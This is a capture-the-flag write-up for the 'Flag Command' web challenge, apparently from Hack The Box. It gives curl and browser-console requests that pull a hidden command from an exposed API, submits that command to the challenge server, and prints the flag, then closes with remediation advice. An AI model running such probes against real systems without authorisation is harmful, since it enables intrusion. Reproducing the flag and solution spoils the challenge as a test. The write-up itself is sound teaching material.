# Flag Command CTF Challenge - Solution Writeup

**Challenge Name:** Flag Command  
**Category:** Web  
**Difficulty:** Very Easy  
**Points:** 925  
**Date Solved:** 2025-11-09

---

## Challenge Description

"Embark on the 'Dimensional Escape Quest' where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!"

---

## Target Information

- **IP Address:** 83.136.249.223
- **Port:** 53353
- **URL:** http://83.136.249.223:53353

---

## Reconnaissance

### Initial Assessment

The challenge presents a terminal-based text adventure game in the browser. The interface mimics a command-line terminal where players navigate through a forest by entering commands.

### Application Structure

The web application consists of:
- **HTML Frontend:** Terminal-style interface
- **JavaScript Modules:**
  - `main.js` - Core game logic and command processing
  - `commands.js` - Game text and available commands
  - `game.js` - Win/lose conditions
- **API Endpoints:**
  - `/api/options` - Returns available game commands
  - `/api/monitor` - Processes player commands

---

## Vulnerability Analysis

### Information Disclosure via API

**Endpoint:** `/api/options`

**Issue:** The API endpoint exposes all possible commands including a hidden "secret" command that's not revealed during normal gameplay.

**API Response:**
```json
{
    "allPossibleCommands": {
        "1": [
            "HEAD NORTH",
            "HEAD WEST",
            "HEAD EAST",
            "HEAD SOUTH"
        ],
        "2": [
            "GO DEEPER INTO THE FOREST",
            "FOLLOW A MYSTERIOUS PATH",
            "CLIMB A TREE",
            "TURN BACK"
        ],
        "3": [
            "EXPLORE A CAVE",
            "CROSS A RICKETY BRIDGE",
            "FOLLOW A GLOWING BUTTERFLY",
            "SET UP CAMP"
        ],
        "4": [
            "ENTER A MAGICAL PORTAL",
            "SWIM ACROSS A MYSTERIOUS LAKE",
            "FOLLOW A SINGING SQUIRREL",
            "BUILD A RAFT AND SAIL DOWNSTREAM"
        ],
        "secret": [
            "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
        ]
    }
}
```

### Code Analysis

In `main.js`, the game checks if a command is valid:

```javascript
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    if (availableOptions[currentStep].includes(currentCommand) || 
        availableOptions['secret'].includes(currentCommand)) {
        await fetch('/api/monitor', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 'command': currentCommand })
        })
        // ... handles response
    }
}
```

The code explicitly checks for commands in `availableOptions['secret']`, meaning the secret command can be used at any step of the game.

---

## Exploitation

### Method 1: Browser Developer Tools

1. **Open Developer Tools** (F12)
2. **Navigate to Network tab**
3. **Load the page** - observe the request to `/api/options`
4. **Inspect the response** - find the secret command
5. **Type the secret command** in the game terminal

### Method 2: Direct API Access (Used)

```bash
# Step 1: Discover the secret command
curl -s http://83.136.249.223:53353/api/options

# Step 2: Execute the secret command
curl -s -X POST http://83.136.249.223:53353/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

### Response

```json
{
    "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_704156b1c47611c8b892c135e5ea0663}"
}
```

---

## Flag

```
HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_704156b1c47611c8b892c135e5ea0663}
```

The flag message translates to: "Developer tools are best, what you think??!"

---

## Security Issues

### 1. API Information Disclosure

**Problem:** The `/api/options` endpoint reveals all possible commands, including secret ones, without any authentication or obfuscation.

**Impact:**
- Players can bypass the entire game by discovering the secret command
- No security through obscurity
- Game logic is completely exposed

### 2. Client-Side Game Logic

**Problem:** All game logic is handled client-side in JavaScript, making it easily inspectable and modifiable.

**Impact:**
- Complete game state can be manipulated
- Command validation is client-side (though server validates too)
- Easy to reverse engineer

---

## Remediation Recommendations

### 1. Don't Expose Secret Commands in API

**Bad:**
```javascript
{
    "secret": ["SECRET_COMMAND"]
}
```

**Better:**
```javascript
// Don't include secret commands in the options response
// Validate on server-side only
```

### 2. Server-Side Validation Only

```javascript
// Server should validate commands without exposing what's valid
if (isValidCommand(command, currentStep)) {
    // Process command
} else {
    return { error: "Invalid command" };
}
```

### 3. Rate Limiting

Implement rate limiting on API endpoints to prevent brute-force attempts:
```javascript
// Express.js example
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/', apiLimiter);
```

### 4. Obfuscate Client-Side Code

While not a security measure, it makes reverse engineering harder:
- Minify JavaScript
- Use webpack/bundlers
- Avoid descriptive variable names like "secret"

---

## Lessons Learned

1. **Developer Tools are Powerful** - Browser DevTools can reveal hidden application behavior
2. **API Security** - Don't expose sensitive data through API endpoints
3. **Client-Side Trust** - Never trust client-side validation or logic
4. **Information Disclosure** - Carefully review what data APIs return
5. **Security by Obscurity Fails** - Hiding things in code doesn't make them secure

---

## OWASP References

- **A01:2021 – Broken Access Control**
- **A05:2021 – Security Misconfiguration**
- **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**

---

## Tools Used

- `curl` - HTTP client for API interaction
- `python3 -m json.tool` - JSON pretty-printing
- Browser Developer Tools (alternative method)

---

## Attack Flow

```
1. Access web application
   ↓
2. Discover /api/options endpoint
   ↓
3. Find secret command in API response
   ↓
4. Submit secret command to /api/monitor
   ↓
5. Receive flag in response
```

---

## Timeline

1. **00:00** - Challenge started, accessed web application
2. **00:01** - Analyzed JavaScript source code
3. **00:02** - Discovered /api/options endpoint
4. **00:03** - Found secret command in API response
5. **00:04** - Executed secret command and retrieved flag

**Total Time:** ~4 minutes

---

## Alternative Solutions

### 1. Browser Console Method
```javascript
// In browser console
fetch('/api/options')
  .then(r => r.json())
  .then(d => console.log(d.allPossibleCommands.secret));

// Then type the secret command in the game terminal
```

### 2. Playing Through the Game
While theoretically possible to play through all paths, the secret command provides immediate access to the flag without navigating the game tree.

---

## Additional Notes

- The challenge name "Flag Command" hints that there's a specific command that gives you the flag
- The flag message emphasizes the importance of developer tools in web security testing
- This is a beginner-friendly challenge teaching:
  - API inspection
  - Browser DevTools usage
  - Client-side code analysis
  - Information disclosure vulnerabilities

---

## Key Takeaway

**Always inspect network traffic and API responses when testing web applications. Client-side code and API endpoints often reveal more than intended.**

